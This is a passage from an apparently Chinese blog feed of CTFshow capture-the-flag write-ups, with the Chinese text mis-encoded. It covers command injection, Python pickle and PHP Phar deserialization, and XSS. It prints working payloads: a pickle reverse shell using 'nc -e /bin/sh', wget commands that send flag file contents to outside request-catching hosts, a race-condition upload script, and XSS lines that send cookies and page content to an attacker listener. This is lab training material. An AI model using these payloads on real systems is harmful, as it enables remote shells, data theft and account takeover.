spellcheck="true">//å°†æ–‡ä»¶è¿›è¡Œæ”¹åæ“ä½œ</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'DOCUMENT_ROOT'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//åˆ é™¤å½“å‰ç›®å½•ä¸‹ç”±ä½ ç¼–è¾‘çš„æ–‡ä»¶</span>        <span class="token keyword">echo</span> <span class="token string">'work done'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'where is flag?'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»¤filename=1.php;cat f*</p><p><strong>payloadï¼š</strong></p><p><code>?fn=php%3bcat flag.php</code></p><h1 id="web277â€”â€”pythonååºåˆ—åŒ–"><a href="#web277â€”â€”pythonååºåˆ—åŒ–" class="headerlink" title="web277â€”â€”pythonååºåˆ—åŒ–"></a>web277â€”â€”pythonååºåˆ—åŒ–</h1><p><strong>æœªæˆåŠŸ</strong></p><p>[ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹ Python ååºåˆ—åŒ–æ¼æ´](<a href="https://www.k0rz3n.com/2018/11/12/ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹Python" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/12/ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹Python</a> ååºåˆ—åŒ–æ¼æ´/)</p><p>æœ‰vpsä½†æ˜¯ä¸ä¼šè™šæ‹Ÿç›®å½•æ˜ å°„åˆ°ç«¯å£æ‰€ä»¥æ”¾å¼ƒè¿™ä¸ªæ–¹æ³•ï¼š</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">import</span> requests<span class="token keyword">class</span> <span class="token class-name">exp</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'nc ***.***.***.*** 39543 -e /bin/sh'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#æ­¤å¤„éœ€è¦nc VPSçš„IP...</span>a<span class="token operator">=</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span>s<span class="token operator">=</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span>url<span class="token operator">=</span><span class="token string">"http://2ecec748-b3b0-4285-8e82-3531e90c2679.chall.ctf.show:8080/backdoor"</span>params<span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">'data'</span><span class="token punctuation">:</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">}</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>params<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ©ç”¨equestbinè¿™ä¸ªç½‘ç«™<code>https://requestbin.net/</code>,é€‰æ‹©<code>Create a RequestBin</code>è·å–ä¸€ä¸ªåœ°å€<br>pocå¦‚ä¸‹ï¼šé€šè¿‡wgetæ–¹å¼ï¼Œå°†flagæ”¾åœ¨URLä¸­</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token keyword">import</span> os<span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">class</span> <span class="token class-name">RunCmd</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'wget http://requestbin.net/r/duwbu270?a=`cat fla*`'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>RunCmd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># m=base64.b64decode(base64.b64encode(pickle.dumps(RunCmd())))</span><span class="token comment" spellcheck="true"># m=pickle.loads(m)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web276â€”â€”Pharååºåˆ—åŒ–"><a href="#web276â€”â€”Pharååºåˆ—åŒ–" class="headerlink" title="web276â€”â€”Pharååºåˆ—åŒ–"></a>web276â€”â€”Pharååºåˆ—åŒ–</h1><p><a href="https://xz.aliyun.com/t/2715" target="_blank" rel="noopener">åˆæ¢phar://</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">filter</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filecontent</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$evilfile</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$fn</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filecontent</span><span class="token operator">=</span><span class="token variable">$fn</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checkevil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/php|\.\./i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">evilfile</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filecontent</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">evilfile</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">evilfile</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">evilfile</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">admin</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'rm '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">filter</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkevil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'DOCUMENT_ROOT'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'work done'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'where is flag?'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸ºä»€ä¹ˆéœ€è¦ç”¨pharæ–‡ä»¶ï¼Œå› ä¸ºæ²¡æœ‰ååºåˆ—åŒ–çš„ç‚¹ï¼Œä½ å°±æ— æ³•è®©adminçš„å€¼ä¸ºtrueï¼Œè€Œè¿™é‡Œæ­£å¥½å­˜åœ¨<code>file_put_contents</code>å‡½æ•°å°±å¯ä»¥ç”¨<code>phar://</code>æ¥å°è¯•ä¸€ä¸‹å†™å…¥æ–‡ä»¶</p><p><strong>ç”Ÿæˆyn.pharæ–‡ä»¶ï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">filter</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string">"1.txt;cat f*;"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filecontent</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$evilfile</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">filter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"yn.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//åç¼€åå¿…é¡»ä¸ºphar</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//è®¾ç½®stub</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><span class="token comment" spellcheck="true">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>pythonç«äº‰è„šæœ¬ï¼š</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingurl<span class="token operator">=</span><span class="token string">"http://66155619-f7c6-4fb4-acf1-d196be37cdb8.chall.ctf.show:8080/"</span>f<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">"./yn.phar"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span>content<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#ä¸Šä¼ 1.pharï¼Œå†…å®¹æ˜¯æœ¬åœ°æ–‡ä»¶ï¼šphar.phar</span>    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"?fn=1.phar"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#åˆ©ç”¨æ¡ä»¶ç«äº‰ï¼Œå°è¯•phar://ååºåˆ—åŒ–1.pharï¼Œ1.pharæ²¡è¢«åˆ é™¤å°±èƒ½è¢«ååºåˆ—åŒ–ï¼Œå› è€Œå°±èƒ½æ‰§è¡Œsystem()å‡½æ•°ä»è€Œæ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"?fn=phar://1.phar/"</span><span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"ctfshow{"</span><span class="token keyword">in</span> r<span class="token punctuation">.</span>text <span class="token operator">or</span> <span class="token string">"flag{"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    t1<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>upload<span class="token punctuation">)</span>    t2<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210904113338191.png" alt="image-20210904113338191"></p><h1 id="web278â€”â€”Pythonååºåˆ—åŒ–"><a href="#web278â€”â€”Pythonååºåˆ—åŒ–" class="headerlink" title="web278â€”â€”Pythonååºåˆ—åŒ–"></a>web278â€”â€”Pythonååºåˆ—åŒ–</h1><p>åˆ©ç”¨burpçš„<code>Collaborator client</code>å¤–å¸¦</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">class</span> <span class="token class-name">RunCmd</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'wget z994qip2ejzbdjrvv9c5hfl68xen2c.burpcollaborator.net?a=`cat fla*`'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>RunCmd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210904123238061.png" alt="image-20210904123238061"></p>]]></content>
      
      
      <categories>
          
          <category> CTFshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowä¹‹web(äº”)</title>
      <link href="/2021/08/06/ctfshow-zhi-xss/"/>
      <url>/2021/08/06/ctfshow-zhi-xss/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="XSSå¹³å°"><a href="#XSSå¹³å°" class="headerlink" title="XSSå¹³å°"></a>XSSå¹³å°</h1><pre><code>document.cookie è·å–é¥¼å¹²çš„jsä»£ç æ¨èxsså¹³å°ï¼šhttp://xsscom.com/ ï¼Œ https://xss.pt/</code></pre><p>JavaScriptçš„ <code>document.cookie</code> å°†ä»¥<code>å­—ç¬¦ä¸²</code>çš„æ–¹å¼è¿”å›<code>æ‰€æœ‰</code>çš„cookieï¼Œç±»å‹æ ¼å¼ï¼š <code>cookie1=value; cookie2=value; cookie3=value;</code></p><h1 id="2021-08-06"><a href="#2021-08-06" class="headerlink" title="2021-08-06"></a>2021-08-06</h1><h1 id="web316-åå°„å‹"><a href="#web316-åå°„å‹" class="headerlink" title="web316(åå°„å‹)"></a>web316(åå°„å‹)</h1><p>åˆ©ç”¨xsså¹³å°é‡Œçš„ä»£ç è¿›è¡Œæ”»å‡»ï¼š <code>http://xsscom.com/</code></p><p>å»ºé€ å®Œé¡¹ç›®ä»¥åï¼Œå¤åˆ¶ä»£ç ï¼š</p><p><code>&lt;script src=http://xsscom.com//Y9GOjn&gt;</code></p><p>åˆ©ç”¨çš„å°±æ˜¯è®©ç‚¹å‡»çš„äººçš„å»è§¦å‘æ¶æ„çš„è¿æ¥ï¼Œè¿™é‡Œåˆ©ç”¨çš„æ˜¯ä¸€ä¸ªå›¾ç‰‡æ ‡ç­¾ï¼ŒåŸç†å°±æ˜¯ç„¶å®¢æˆ·ç«¯å»è¯·æ±‚è¿™ä¸ªç½‘ç«™ï¼Œé¡ºå¸¦ç€ä¹Ÿå°±å§cookieç»™å¸¦å‡ºæ¥äº†</p><h1 id="web317ã€318ã€319"><a href="#web317ã€318ã€319" class="headerlink" title="web317ã€318ã€319"></a>web317ã€318ã€319</h1><p>317è¿‡æ»¤äº†script<br>318è¿‡æ»¤äº†img</p><p>æ¢ä¸€ä¸ªä»£ç æ ‡ç­¾å°†ç»§ç»­æ’</p><h1 id="web320ã€321ã€322â€”â€”è¿‡æ»¤ç©ºæ ¼"><a href="#web320ã€321ã€322â€”â€”è¿‡æ»¤ç©ºæ ¼" class="headerlink" title="web320ã€321ã€322â€”â€”è¿‡æ»¤ç©ºæ ¼"></a>web320ã€321ã€322â€”â€”è¿‡æ»¤ç©ºæ ¼</h1><p>å¯ç”¨tabç»•è¿‡ï¼Œæˆ–è€…/ä»£æ›¿</p><h1 id="web323ã€324ã€325ã€326"><a href="#web323ã€324ã€325ã€326" class="headerlink" title="web323ã€324ã€325ã€326"></a>web323ã€324ã€325ã€326</h1><p>è¿‡æ»¤äº†iframe<br><code>&lt;body/onload=document.location=&#39;http://ssjsj.ak6666.top:20002/?cookie=&#39;+document.cookie;&gt;</code><br>è¾“å…¥åæœåŠ¡å™¨å¼€å¯ç›‘ nc -lvp 20002ï¼ˆbotä¼šæ¯éš”ä¸€æ®µæ—¶é—´è®¿é—®è¾“å…¥çš„å†…å®¹ï¼‰<br>çœ‹ç›‘å¬åˆ°çš„å†…å®¹ä¼šæœ‰flag</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210806205040780.png" alt></p><h1 id="web327-å‚¨å­˜å‹xss"><a href="#web327-å‚¨å­˜å‹xss" class="headerlink" title="web327(å‚¨å­˜å‹xss)"></a>web327(å‚¨å­˜å‹xss)</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210806210549858.png" alt></p><h1 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h1><p>å†æ³¨å†Œçš„åœ°æ–¹xssè¿›å»ä¼šæŠ“åˆ°adminçš„cookieï¼Œç„¶åç‚¹å‡»ç”¨æˆ·ç®¡ç†ä¼šå‡ºç°apiè¢«è°ƒç”¨ï¼Œå°†æ‰€æœ‰æŠ“åˆ°çš„åŒ…éƒ½ä¿®æ”¹cookieåå¯ä»¥è¶ŠæƒæˆåŠŸï¼</p><p><strong>payloadï¼š</strong></p><p><code>&lt;script&gt;window.open(&#39;http://ssjsj.ak6666.top:20003/&#39;+document.cookie)&lt;/script&gt;</code></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210807131443722.png" alt="image-20210807131443722"></p><h1 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h1><p><strong>å¼ºäºweb328åŸå› </strong>ï¼šcookieåœ¨è¢«æ‹¦æˆªåˆ°çš„æ—¶å€™å·²ç»æ˜¯å¤±æ•ˆçš„äº†ï¼Œæ‰€ä»¥ç›—ç”¨cookieå°†æ˜¯ä¸å¯è¡Œçš„æ–¹æ³•</p><p><strong>payload</strong></p><p><code>&lt;script&gt;window.open(&#39;http://ssjsj.ak6666.top:20003/&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[1].innerHTML)&lt;/script&gt;</code></p><p>é€šè¿‡document.getElementsByClassName(â€˜layui-table-cell laytable-cell-1-0-1â€™)[1].innerHTMLè·å–åˆ°æŒ‡å®šçš„å†…å®¹ï¼Œ</p><pre class="line-numbers language-python"><code class="language-python">getElementsByClassNameï¼šè·å–æ‰€æœ‰æŒ‡å®šç±»åçš„å…ƒç´ è¿˜æœ‰innerHTMLå’ŒouterHTMLçš„åŒºåˆ«<span class="token number">1</span>ï¼‰innerHTML<span class="token punctuation">:</span>ã€€ã€€ä»å¯¹è±¡çš„èµ·å§‹ä½ç½®åˆ°ç»ˆæ­¢ä½ç½®çš„å…¨éƒ¨å†…å®¹<span class="token punctuation">,</span>ä¸åŒ…æ‹¬Htmlæ ‡ç­¾ã€‚<span class="token number">2</span>ï¼‰outerHTML<span class="token punctuation">:</span>ã€€ã€€é™¤äº†åŒ…å«innerHTMLçš„å…¨éƒ¨å†…å®¹å¤–<span class="token punctuation">,</span> è¿˜åŒ…å«å¯¹è±¡æ ‡ç­¾æœ¬èº«ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210807143206412.png" alt></p><p>è¿™æ ·å°±å¯ä»¥å¾—è§¦å‘jsäº‹ä»¶ï¼Œæ¥å¾—åˆ°æƒ³è¦çš„å†…å®¹ï¼Œæœºå™¨äººå¯èƒ½æœ‰ç‚¹æ‡’ï¼Œä¸çŸ¥é“æˆ‘çš„ä¸ºä»€ä¹ˆè€æ˜¯è§¦å‘ä¸äº†</p><h1 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h1><p>æ­¤é¢˜æ˜¯æ ¹æ®ä¸Šä¸€é¢˜çš„change.phpæ¥çŒœæµ‹å‡ºå…·æœ‰æ”¹å¯†ç åŠŸèƒ½</p><p>æ‰€ä»¥åˆ©ç”¨æ­¤åŠŸèƒ½æ¥å®ç°csrfç±»ä¼¼çš„æ”»å‡»ï¼Œpayloadï¼š</p><p><code>&lt;script&gt;window.open(&quot;http://127.0.0.1/api/change.php?p=a&quot;)&lt;/script&gt;</code></p><p>éé¢„æœŸï¼šè·å–é¡µé¢æºç ï¼Œç”¨document.querySelectorè·å–ï¼Œè·å–çš„ç±»æ˜¯div.layui-containerï¼Œ</p><blockquote><p>è·å–æ–‡æ¡£ä¸­ id=â€œdemoâ€ çš„å…ƒç´ ï¼š<br><code>document.querySelector(&quot;#demo&quot;);</code></p></blockquote><p><code>&lt;script&gt;window.open(&#39;http://domain+port/&#39;+document.querySelector(&#39;#top &gt; div.layui-container&#39;).textContent)&lt;/script&gt;</code></p><h1 